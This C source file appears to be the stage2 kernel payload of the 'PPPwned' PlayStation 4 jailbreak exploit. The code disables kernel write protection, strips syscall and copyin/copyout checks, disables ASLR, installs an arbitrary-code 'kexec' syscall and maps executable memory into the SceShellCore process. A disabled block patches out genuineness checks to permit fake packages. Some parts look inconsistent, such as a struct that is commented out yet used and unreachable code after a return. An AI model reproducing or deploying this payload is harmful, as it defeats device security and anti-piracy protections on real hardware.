/*
 * Copyright (C) 2024 Andy Nguyen
 *
 * This software may be modified and distributed under the terms
 * of the MIT license.  See the LICENSE file for details.
 */

// clang-format off
#define _KERNEL
#include <stddef.h>
#include "proc_utils.h"
#include <string.h>
#include <sys/fcntl.h>
#include <sys/types.h>
#include <sys/sysent.h>
#include <sys/sysproto.h>
#include <sys/syscall.h>
#include <sys/pcpu.h>
#include <sys/proc.h>
#include <machine/specialreg.h>
#include "offsets.h"
// clang-format on

// by OSM-Made
/**typedef struct {
  int type;
  int reqId;
  int priority;
  int msgId;
  int targetId;
  int userId;
  int unk1;
  int unk2;
  int appId;
  int errorNum;
  int unk3;
  unsigned char useIconImageUri;
  char message[1024];
  char iconUri[1024];
  char unk[1024];
} OrbisNotificationRequest;*/

struct sysent *sysents;

size_t strlen(const char *s)
{
  const char *t = s;
  while (*t)
    t++;
  return t - s;
}

int memcmp(const void *str1,
           const void *str2, size_t count)
{
  const unsigned char *s1 = (const unsigned char *)str1;
  const unsigned char *s2 = (const unsigned char *)str2;

  while (count-- > 0)
  {
    if (*s1++ != *s2++)
      return s1[-1] < s2[-1] ? -1 : 1;
  }
  return 0;
}

static int ksys_open(struct thread *td,
                     const char *path, int flags, int mode)
{
  int (*sys_open)(struct thread *, struct open_args *) =
      (void *)sysents[SYS_open].sy_call;

  td->td_retval[0] = 0;

  struct open_args uap;
  uap.path = (char *)path;
  uap.flags = flags;
  uap.mode = mode;
  int error = sys_open(td, &uap);
  if (error)
    return -error;

  return td->td_retval[0];
}

static int ksys_write(struct thread *td, int fd,
                      const void *buf,
                      size_t nbytes)
{
  int (*sys_write)(struct thread *, struct write_args *) =
      (void *)sysents[SYS_write].sy_call;

  td->td_retval[0] = 0;

  struct write_args uap;
  uap.fd = fd;
  uap.buf = buf;
  uap.nbyte = nbytes;
  int error = sys_write(td, &uap);
  if (error)
    return -error;

  return td->td_retval[0];
}

static int ksys_close(struct thread *td, int fd)
{
  int (*sys_close)(struct thread *, struct close_args *) =
      (void *)sysents[SYS_close].sy_call;

  td->td_retval[0] = 0;

  struct close_args uap;
  uap.fd = fd;
  int error = sys_close(td, &uap);
  if (error)
    return -error;

  return td->td_retval[0];
}

struct sce_proc * proc_find_by_name(uint8_t * kbase,
  const char * name) {
  struct sce_proc * p;

  if (!name) {
    return NULL;
  }
  //printf("after name\n");

  p = * (struct proclist ** )(kbase + all_proc_offset);
  do {
    // printf("p->p_comm: %s\n", p->p_comm);
    if (!memcmp(p -> p_comm, name, strlen(name))) {
      return p;
    }
  } while ((p = p -> p_forw));

  return NULL;
}

/**#define USB_LOADER 1
#if FIRMWARE == 803 // Temporary dirty hack
  #define ENABLE_DEBUG_MENU 1
  #undef USB_LOADER
#endif*/

#define ENABLE_DEBUG_MENU 0
#if ENABLE_DEBUG_MENU
  int shellui_patch(struct thread * td, uint8_t * kbase) {
    uint8_t * libkernel_sys_base = NULL,
      * executable_base = NULL,
      * app_base = NULL;

    size_t n;
    void * M_TEMP = (void * )(kbase + M_TEMP_offset);
    uint64_t kaslr_offset = rdmsr(MSR_LSTAR) - kdlsym_addr_Xfast_syscall;
    void( * free)(void * ptr, int type) = (void * )(kbase + free_offset);
    int( * printf)(const char * format, ...) = (void * ) kdlsym(printf);

    struct proc_vm_map_entry * entries = NULL;
    size_t num_entries = 0;

    int ret = 0;

    uint32_t ofs_to_ret_1[] = {
      sys_debug_menu,
      sys_debug_menu_1,
    };

    uint8_t mov__eax_1__ret[6] = {
      0xB8,
      0x01,
      0x00,
      0x00,
      0x00,
      0xC3
    };

    struct sce_proc * ssui = proc_find_by_name(kbase, "SceShellUI");

    if (!ssui) {
      ret = -1;
      goto error;
    }
    printf("ssui->pid: %d\n", ssui -> pid);

    ret = proc_get_vm_map(td, kbase, ssui, & entries, & num_entries);
    if (ret)
      goto error;

    for (int i = 0; i < num_entries; i++) {
      if (!memcmp(entries[i].name, "executable", 10) && (entries[i].prot >= (PROT_READ | PROT_EXEC))) {
        executable_base = (uint8_t * ) entries[i].start;
        break;
      }
    }

    if (!executable_base) {
      ret = 1;
      goto error;
    }

    for (int i = 0; i < num_entries; i++) {
      if (!memcmp(entries[i].name, "app.exe.sprx", 12) && (entries[i].prot >= (PROT_READ | PROT_EXEC))) {
        app_base = (uint8_t * ) entries[i].start;
        break;
      }
    }

    if (!app_base) {
      ret = 1;
      goto error;
    }

    // enable remote play menu - credits to Aida
    for (int i = 0; i < num_entries; i++) {
      if (!memcmp(entries[i].name, "libkernel_sys.sprx", 18) && (entries[i].prot >= (PROT_READ | PROT_EXEC))) {
        libkernel_sys_base = (uint8_t * ) entries[i].start;
        break;
      }
    }

    if (!libkernel_sys_base) {
      ret = -1;
      goto error;
    }

    // enable debug settings menu
    for (int i = 0; i < COUNT_OF(ofs_to_ret_1); i++) {
      ret = proc_write_mem(td, kbase, ssui, (void * )(libkernel_sys_base + ofs_to_ret_1[i]), sizeof(mov__eax_1__ret), mov__eax_1__ret, & n);
      if (ret)
        goto error;
    }

    error:
      if (entries)
        free(entries, M_TEMP);

    return ret;
  }

  int shellcore_fpkg_patch(struct thread * td, uint8_t * kbase) {
    uint8_t * text_seg_base = NULL;
    size_t n;

    struct proc_vm_map_entry * entries = NULL;
    size_t num_entries = 0;

    int ret = 0;

    uint32_t call_ofs_for__xor__eax_eax__3nop[] = {
      // call sceKernelIsGenuineCEX
      sceKernelIsGenuineCEX,
      sceKernelIsGenuineCEX_1,
      sceKernelIsGenuineCEX_2,
      sceKernelIsGenuineCEX_3,
      // call nidf_libSceDipsw
      dipsw_libSceDipsw,
      dipsw_libSceDipsw_1,
      dipsw_libSceDipsw_2,
      dipsw_libSceDipsw_3,
    };

    void * M_TEMP = (void * )(kbase + M_TEMP_offset);
    void( * free)(void * ptr, int type) = (void * )(kbase + free_offset);
    uint64_t kaslr_offset = rdmsr(MSR_LSTAR) - kdlsym_addr_Xfast_syscall;
    int( * printf)(const char * format, ...) = (void * ) kdlsym(printf);

    uint8_t xor__eax_eax__inc__eax[5] = {
      0x31,
      0xC0,
      0xFF,
      0xC0,
      0x90
    };

    struct proc * ssc = proc_find_by_name(kbase, "SceShellCore");

    if (!ssc) {
      ret = -1;
      goto error;
    }

    ret = proc_get_vm_map(td, kbase, ssc, & entries, & num_entries);
    if (ret) {
      goto error;
    }

    for (int i = 0; i < num_entries; i++) {
      if (entries[i].prot == (PROT_READ | PROT_EXEC)) {
        text_seg_base = (uint8_t * ) entries[i].start;
        break;
      }
    }

    if (!text_seg_base) {
      ret = -1;
      goto error;
    }

    // enable installing of debug packages
    for (int i = 0; i < COUNT_OF(call_ofs_for__xor__eax_eax__3nop); i++) {
      ret = proc_write_mem(td, kbase, ssc, (void * )(text_seg_base + call_ofs_for__xor__eax_eax__3nop[i]), 5, "\x31\xC0\x90\x90\x90", & n);
      if (ret)
        goto error;
    }

    ret = proc_write_mem(td, kbase, ssc, text_seg_base + enable_data_mount_patch, sizeof(xor__eax_eax__inc__eax), xor__eax_eax__inc__eax, & n);
    if (ret)
      goto error;

    // enable fpkg for patches
    ret = proc_write_mem(td, kbase, ssc, (void * )(text_seg_base + enable_fpkg_patch), 8, "\xE9\x96\x00\x00\x00\x90\x90\x90", & n);
    if (ret)
      goto error;

    // this offset corresponds to "fake\0" string in the Shellcore's memory
    ret = proc_write_mem(td, kbase, ssc, (void * )(text_seg_base + fake_free_patch), 5, "free\0", & n);
    if (ret)
      goto error;

    // make pkgs installer working with external hdd
    ret = proc_write_mem(td, kbase, ssc, (void * )(text_seg_base + pkg_installer_patch), 1, "\0", & n);
    if (ret)
      goto error;

    // enable support with 6.xx external hdd
    ret = proc_write_mem(td, kbase, ssc, (void * )(text_seg_base + ext_hdd_patch), 1, "\xEB", & n);
    if (ret)
      goto error;
    #if FIRMWARE == 900 // FW 9.00
    // enable debug trophies on retail
    ret = proc_write_mem(td, kbase, ssc, (void * )(text_seg_base + debug_trophies_patch), 5, "\x31\xc0\x90\x90\x90", & n);
    if (ret) {
      goto error;
    }
    #endif

    error:
      if (entries)
        free(entries, M_TEMP);

    return ret;
  }
#endif

#define SYS_kexec 11
struct sys_kexec_args {
  int( * fptr)(void *,... );
  void * arg;
};

static int sys_kexec(struct thread * td, struct sys_kexec_args * uap) {
  return uap->arg ? uap->fptr(td, uap->arg) : uap->fptr(td);
}

void stage2(void)
{

  // Use "kmem" for all patches
  uint8_t *kmem;
  uint64_t kaslr_offset = rdmsr(MSR_LSTAR) - kdlsym_addr_Xfast_syscall;
  uint8_t *kbase = (uint8_t *)(rdmsr(0xC0000082) - 0x1C0);
  int (*printf)(const char *format, ...) = (void *)kdlsym(printf);

  sysents = (struct sysent *)kdlsym(sysent);

  printf("**********************************   stage2\n");

  // Disable write protection
  uint64_t cr0 = rcr0();
  load_cr0(cr0 & ~CR0_WP);

  // Allow syscalls everywhere
  *(uint32_t *)kdlsym(amd_syscall_patch1) = 0;
  *(uint16_t *)kdlsym(amd_syscall_patch2) = 0x9090;
  *(uint16_t *)kdlsym(amd_syscall_patch3) = 0x9090;
  *(uint8_t *)kdlsym(amd_syscall_patch4) = 0xeb;

  // Allow user and kernel addresses
  uint8_t nops[] = {0x90, 0x90, 0x90};

  *(uint16_t *)kdlsym(copyin_patch1) = 0x9090;
  memcpy((void *)kdlsym(copyin_patch2), nops, sizeof(nops));

  *(uint16_t *)kdlsym(copyout_patch1) = 0x9090;
  memcpy((void *)kdlsym(copyout_patch2), nops, sizeof(nops));

  *(uint16_t *)kdlsym(copyinstr_patch1) = 0x9090;
  memcpy((void *)kdlsym(copyinstr_patch2), nops, sizeof(nops));
  *(uint16_t *)kdlsym(copyinstr_patch3) = 0x9090;

  // patch ASLR, thanks 2much4u
  *(uint16_t * )(kbase + disable_aslr_p) = 0x9090;

  // patch kmem_alloc
  *(uint8_t * )(kbase + kemem_1) = VM_PROT_ALL;
  *(uint8_t * )(kbase + kemem_2) = VM_PROT_ALL;

  // Install kexec syscall 11
  struct sysent * sys = & sysents[SYS_kexec];
  sys -> sy_narg = 2;
  sys -> sy_call = (void * ) sys_kexec;
  sys -> sy_thrcnt = 1;
  printf("kexec added\n");

  // Restore write protection
  load_cr0(cr0);

  int fd;
  struct thread *td = curthread;

  void( * vm_map_lock)(struct vm_map * map) = (void * )(kbase + vm_map_lock_offset);
  struct vmspace * vm;
  struct vm_map * map;
  int r;
  int( * vm_map_insert)(struct vm_map * map, struct vm_object * object,
      vm_ooffset_t offset, vm_offset_t start, vm_offset_t end,
      vm_prot_t prot, vm_prot_t max, int cow) =
    (void * )(kbase + vm_map_insert_offset);
  int( * vm_map_unlock)(struct vm_map * map) = (void * )(kbase + vm_map_unlock_offset);

  #if ENABLE_DEBUG_MENU
    printf("Enabling Debug Menu\n");
    shellui_patch(td, kbase);
    shellcore_fpkg_patch(td, kbase);
    printf("Done.\n");
  #endif

  // Send notification
   OrbisNotificationRequest notify = {};
   notify.targetId = -1;
   notify.useIconImageUri = 1;

  printf("Finding SceShellCore process...\n");
  struct sce_proc *p = proc_find_by_name(kbase, "SceShellCore");
  if (!p) {
    printf("Could not find SceShellCore process!\n");
    return;
  }
  printf("Found SceShellCore process @ PID %d\n", p->pid);

  vm = p->p_vmspace;
  map = &vm->vm_map;

  // allocate some memory.
  vm_map_lock(map);
  r = vm_map_insert(map, NULL, NULL, PAYLOAD_BASE, PAYLOAD_BASE + 0x400000, VM_PROT_ALL, VM_PROT_ALL, 0);
  vm_map_unlock(map);
  if (r) {
    printf("failed to allocate payload memory!\n");
    memcpy(&notify.message, "failed to allocate payload memory", 35);
    //return r;
  } else {
    memcpy(&notify.message, "Allocated payload memory", 26);
  }
  printf("Allocated payload memory @ 0x%016lx\n", PAYLOAD_BASE);
  printf("Writing payload...\n");

  fd = ksys_open(td, "/dev/notification0", O_WRONLY, 0);
  if (!fd)
    fd = ksys_open(td, "/dev/notification0", O_WRONLY | O_NONBLOCK, 0);
  if (!fd)
    fd = ksys_open(td, "/dev/notification1", O_WRONLY, 0);
  if (!fd)
    fd = ksys_open(td, "/dev/notification1", O_WRONLY | O_NONBLOCK, 0);

  if (fd) {
    ksys_write(td, fd, &notify, sizeof(notify));
    ksys_close(td, fd);
  }
  return;

  #if !ENABLE_DEBUG_MENU
    memcpy(&notify.message, "PPPwned: Payload Injected successfully", 40);
  #else
    memcpy(&notify.message, "PPPwned: Debug Settings enabled", 33);
  #endif
  
  fd = ksys_open(td, "/dev/notification0", O_WRONLY, 0);
  if (!fd)
    fd = ksys_open(td, "/dev/notification0", O_WRONLY | O_NONBLOCK, 0);
  if (!fd)
    fd = ksys_open(td, "/dev/notification1", O_WRONLY, 0);
  if (!fd)
    fd = ksys_open(td, "/dev/notification1", O_WRONLY | O_NONBLOCK, 0);

  if (fd)
  {
    ksys_write(td, fd, &notify, sizeof(notify));
    ksys_close(td, fd);
  }
}